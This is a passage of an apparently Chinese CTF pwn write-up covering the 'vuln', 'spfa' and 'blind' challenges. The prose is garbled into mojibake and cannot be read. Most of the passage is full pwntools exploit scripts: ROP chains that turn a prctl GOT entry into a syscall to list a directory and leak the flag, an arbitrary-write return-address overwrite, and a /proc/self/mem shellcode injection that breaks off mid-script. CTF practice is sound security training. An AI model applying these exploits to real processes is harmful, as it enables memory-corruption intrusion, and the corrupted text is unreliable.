src="https://kjimg10.360buyimg.com/ott/jfs/t1/209215/25/29511/55822/63c7ac20Fe576e25c/e415b3e6429764d6.png" style="zoom:80%;" /><p>æ‰€ä»¥è¿˜åº”å…ˆæ³„éœ² flag åç§°æ‰è¡Œï¼Œä¸€å¼€å§‹æƒ³çš„æ˜¯ chroot é€ƒé€¸æˆ–è€… opendir &amp; readdir ä¹‹ç±»çš„æ‰‹æ³•ï¼Ÿï¼Ÿï¼Ÿè™½ç„¶æˆ‘ä¹Ÿä¸ä¼šå°±æ˜¯äº†ã€‚æäº†ä¸€å¤©æ²¡æå‡ºæ¥å°±å»é—®äº†å‡ºé¢˜äººï¼Œå¸ˆå‚…å‘Šè¯‰æˆ‘å°±æ˜¯è¯»ç›®å½•ï¼Œ<strong>ç›®å½•ä¹Ÿæ˜¯æ–‡ä»¶</strong>ï¼Œå¿½ç„¶æƒ³åˆ° â€œ linux ä¸‹ä¸€åˆ‡çš†æ–‡ä»¶â€ çš„ç†è®ºã€‚</p><p>äºæ˜¯ç›´æ¥æƒ³ç€ç›´æ¥ open(â€œ/â€œ) è¿™æ ·å­çœ‹èƒ½ä¸èƒ½ç›´æ¥æŠŠç›®å½•ç›¸å…³æ•°æ®ç”¨ read å’Œ write è¯»å‡ºæ¥ï¼Œä½†å¤±è´¥äº†ï¼Œä¼¼ä¹ read è¯»ä¸äº†ç›®å½•æ–‡ä»¶ï¼Ÿäºæ˜¯å°±åœ¨ 64 ä½ç³»ç»Ÿè°ƒç”¨è¡¨ä¸Šæ‰¾å…¶ä»–ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åèŠ±äº†åŠå¤©æ‰¾åˆ°äº† â€˜getdentsâ€™</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/170693/32/34205/36390/63c7ac20F4f658c9f/6968cf0db5dc8df7.png" style="zoom:80%;" /><p>æ³¨ï¼šè¯¥é¢˜çš„ gadget é‡Œæ²¡æœ‰ syscallï¼Œéœ€è¦æˆ‘ä»¬æ”¹ [ prctl ] ä¸º [ prctl + offset ] syscall è¿™æ ·å­ï¼Œæœ€å 4bit ä¸º 0XCã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/6785/4/26433/55787/63c7acfbF533f2b1c/bebae0932440af72.png" style="zoom:80%;" /><p>è¯¥é¢˜ä¹Ÿæœ‰ csuï¼Œå› æ­¤å¯ä»¥æ„é€ ä»»æ„ç³»ç»Ÿè°ƒç”¨ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r15, r12, r13, r14</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(<span class="number">0x40143A</span>) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(<span class="number">0x401420</span>)</span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401441</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl====&gt;syscall</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(elf.got[<span class="string">&quot;prctl&quot;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,p8(<span class="number">0xc</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x10) bss===&gt;&#x27;/&#x27;</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(&quot;/&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fstat</span></span><br><span class="line"><span class="comment">#temp=0x404088</span></span><br><span class="line"><span class="comment">#io.sendafter(&#x27;size?\n&#x27;,str(-1))</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x38+p64(pop_rdi_ret)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(pop_rsi_r15_ret)+p64(bss-0x10)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(0x4010A0)+csu(0,1,elf.got[&quot;prctl&quot;],3,temp,0)</span></span><br><span class="line"><span class="comment">#payload+=csu(0,1,elf.got[&quot;write&quot;],1,temp,0x300)</span></span><br><span class="line"><span class="comment">#payload+=p64(main)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#io.sendafter(&quot;content?\n&quot;,payload)</span></span><br><span class="line"><span class="comment">#io.send(&#x27;aaaaa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getdents(0,bss,0x300)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss+<span class="number">0x10</span>,<span class="number">78</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],<span class="number">3</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">78</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get flag_name</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">bk=io.recv(<span class="number">20</span>)</span><br><span class="line">log.success(<span class="string">&#x27;flag&#x27;</span>+bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x20) ---- bss=&gt;flag_name</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>+bk+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_name)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(3,bss,0x80);write(1,bss,0x80)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">4</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="spfa"><a href="#spfa" class="headerlink" title="spfa"></a>spfa</h3><p>wp å‡ºæ¥äº†ï¼Œä»»æ„è¯»æ¼æ´å½“æ—¶æ˜¯çœ‹åˆ°äº†çš„ï¼Œå°±æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç®—æ³•è¾¾åˆ°ä»»æ„å†™çš„ç›®çš„ã€‚è¿˜æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œä¸‹é¢ç»†è¯´ã€‚</p><h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><ul><li><p>ä»»æ„è¯»</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/58250/28/23044/25765/63c7ad58F93fb1283/7bb957defcb03fdb.png" style="zoom:80%;" /></li><li><p>å­˜åœ¨äº<code>add</code>å’Œ<code>spfa</code>å†…çš„ä»»æ„å†™</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/187146/37/31980/24100/63c7ad55F9bb13d32/bf2a17e2c9189750.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75161/20/23579/45988/63c7ae06F5dcb0231/ae9e86f5eb192205.png" style="zoom:80%;" /></li><li><p>åé—¨å‡½æ•°</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146622/35/33316/3113/63c7ae06Fa04326d0/02f29734fe8eaceb.png" style="zoom:80%;" /></li></ul><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><ul><li>åˆ©ç”¨ä»»æ„è¯»æ³„éœ² got è¡¨ä¸Šçš„åœ°å€ï¼Œè·å¾— libc_base</li><li>åˆ©ç”¨ä»»æ„è¯»æ³„éœ² _fini_array ä¸Šçš„åœ°å€ï¼Œè·å¾— proc_base</li><li>åˆ©ç”¨ä»»æ„è¯»æ³„éœ² environ å†…çš„ç¯å¢ƒå˜é‡æ ˆåœ°å€ï¼ŒåŠ¨è°ƒè®¡ç®—åç§»å¾—åˆ° main æ ˆçš„è¿”å›åœ°å€</li><li>åˆ©ç”¨ä»»æ„å†™å°†è¿”å›åœ°å€è¦†ç›–ä¸ºåé—¨å‡½æ•°</li></ul><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">io=process(<span class="string">&quot;./spfa&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;chuj.top&quot;,47250)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;spfa&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"><span class="comment">#brute()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;datas?\n&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc_base</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-((elf.sym[<span class="string">&quot;dist&quot;</span>]-elf.got[<span class="string">&quot;setbuf&quot;</span>])//<span class="number">8</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">setbuf=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get proc_base</span></span><br><span class="line">_fini_array=<span class="number">0x6D28</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-(elf.sym[<span class="string">&#x27;dist&#x27;</span>]-_fini_array)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">proc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0x12e0</span></span><br><span class="line">log.success(<span class="string">&quot;proc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get env_stack</span></span><br><span class="line">envir=libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">dist=proc_base+elf.sym[<span class="string">&quot;dist&quot;</span>]</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>((envir-dist)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">env_stack=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">log.success(<span class="string">&quot;env_stack===&gt;&quot;</span>+<span class="built_in">hex</span>(env_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write ret_addr</span></span><br><span class="line">ret_id=(env_stack-<span class="number">0x100</span>-dist)//<span class="number">8</span></span><br><span class="line">backdoor=proc_base+<span class="number">0x16AA</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&quot;0 &quot;</span>+<span class="built_in">str</span>(ret_id)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(backdoor))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><p>é¢˜ç›®è´¨é‡éƒ½å¥½é«˜ï¼Œä½†è¿™å‡ å¤©æ‰“è¿™ä¸ªæ¯”èµ›éƒ½æ²¡å¤ä¹ é«˜æ•°äº†ï¼Œä¹‹åçš„ week é¢˜å°±ä¸æ‰“äº†ï¼Œä½†è¦å¤ç›˜ã€‚</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><p>ä¸€é“ç›²æ‰“é¢˜ï¼Œé¦–å…ˆå‘Šè¯‰äº†æˆ‘ä»¬ write çš„ libc åœ°å€ï¼Œæˆ‘ä»¬ä¾¿èƒ½åˆ©ç”¨<code>LibcSearcher</code>è·å– libcã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/220601/13/24783/19717/63c7ae06F70f2d582/3bd0aaa0971b77d5.png" style="zoom:80%;" /><p>ç„¶åç¨‹åºå‘Šè¯‰æˆ‘ä»¬å¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬äº†è§£ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šLinux å†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ <strong>/proc</strong> æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨è¿è¡Œæ—¶è®¿é—®å†…æ ¸å†…éƒ¨æ•°æ®ç»“æ„ã€æ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚proc æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ª<strong>ä¼ªæ–‡ä»¶</strong>ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚è¯»å– <strong>/proc/self/maps</strong> å¯ä»¥å¾—åˆ°å½“å‰è¿›ç¨‹çš„<strong>å†…å­˜æ˜ å°„å…³ç³»</strong>ï¼Œé€šè¿‡è¯»è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥<strong>å¾—åˆ°å†…å­˜ä»£ç æ®µåŸºå€</strong>ã€‚<span style='color:red;font-weight:550'>/proc/self/mem</span> æ˜¯è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œ<strong>é€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜</strong>ã€‚è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œéœ€è¦ç»“åˆ maps çš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚</p><p>ç¨‹åºç»™äº†æˆ‘ä»¬<code>libcåŸºå€</code>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€æ‰“å¼€<code>/proc/self/mem</code>æ–‡ä»¶ï¼Œæ‰“å¼€åï¼Œç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€è¿›è¡Œç¯¡æ”¹ï¼Œå› ä¸º main å‡½æ•° ret æ—¶è¿”å›çš„æ˜¯<code>__libc_start_main</code>ï¼Œå› æ­¤æˆ‘ä»¬ç¯¡æ”¹è¯¥å†…å­˜å³å¯ï¼ˆ<strong>ç›´æ¥å†™å†…å­˜ç»•å¼€äº† libc æ–‡ä»¶ä¸å¯å†™çš„é˜²æŠ¤</strong>ï¼‰ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/7080/30/21758/7849/63c7ae0bF0edbfbdf/eb5364df131c83a0.png" style="zoom:80%;" /><p>ä½†å› ä¸º main å‡½æ•° <strong>ret çš„æ˜¯ libc_start_main+???</strong> è€Œä¸æ˜¯ libc_start_main+0ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¶³å¤Ÿå¤šçš„ nop æ¥è¦†ç›–åˆ° libc_start_main+???ï¼Œä»¤å…¶æ»‘å€’åœ¨ shellcode ä¸Šã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51916</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = 